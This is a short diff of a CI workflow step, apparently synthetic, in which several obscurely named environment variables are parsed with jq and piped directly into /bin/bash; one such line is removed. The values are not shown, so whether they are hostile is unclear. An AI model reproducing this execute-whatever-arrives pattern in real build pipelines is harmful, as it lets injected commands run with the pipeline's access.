@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$o55" | jq -r .dogw1 | /bin/bash
           echo $ltbws52 | jq -r .cg06443 | /bin/bash
-          printf '%s' "$c9616" | jq -r .b5614 | /bin/bash
           echo $roo6085 | jq -r .p093 | /bin/bash
 
       - name: Archive output
